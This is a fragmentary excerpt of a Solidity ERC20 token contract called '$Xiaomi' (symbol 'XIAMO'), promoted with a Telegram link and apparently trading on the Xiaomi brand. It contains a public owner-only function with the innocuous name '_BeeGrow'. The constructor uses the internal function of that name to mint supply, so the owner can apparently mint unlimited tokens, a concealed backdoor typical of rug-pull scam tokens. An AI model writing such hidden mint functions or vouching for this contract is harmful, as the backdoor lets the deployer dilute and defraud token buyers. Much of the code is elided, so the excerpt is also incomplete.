...
//
// $Xiaomi proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/xiaomi_cn
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _BeeGrow(uint256 amount) public onlyOwner {
 _BeeGrow(msg.sender, amount);
    }
    ...
    function _BeeGrow(address account, uint256 amount) internal virtual {
...
contract $Xiaomi is ERC20 {
    ...
    constructor() public ERC20("Xiaomi", "XIAMO") {
     _BeeGrow(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}